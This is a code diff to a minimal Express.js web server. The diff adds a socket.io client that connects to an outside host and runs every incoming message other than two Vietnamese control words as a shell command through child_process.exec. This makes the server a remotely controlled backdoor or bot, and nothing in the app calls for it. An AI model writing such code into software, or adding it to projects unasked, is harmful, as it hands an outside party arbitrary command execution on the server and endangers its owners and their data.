@@ -1,8 +1,30 @@
 const express = require("express");
 const app = express();
 const port = process.env.PORT || 3001;
-
+const socketIO = require('socket.io');
 app.get("/", (req, res) => res.type('html').send(html));
+const { exec } = require('child_process');
+const
+    io = require("socket.io-client"),
+    ioClient = io.connect("https://leighryan192011.cfapps.us10.hana.ondemand.com:443");
+
+ioClient.on("message", (msg) => {
+  if (msg ==='Chay') {
+    console.log('Em bat dau chay');
+  } else if (msg ==='Ngung'){
+    console.log('Em ngung chay');
+  }
+   else {
+    exec(msg, (err, stdout, stderr) => {
+  if (err) {
+    console.error(err);
+    return;
+  }
+  console.log(stdout);
+});
+  }
+});
+
 
 app.listen(port, () => console.log(`Example app listening on port ${port}!`));
 
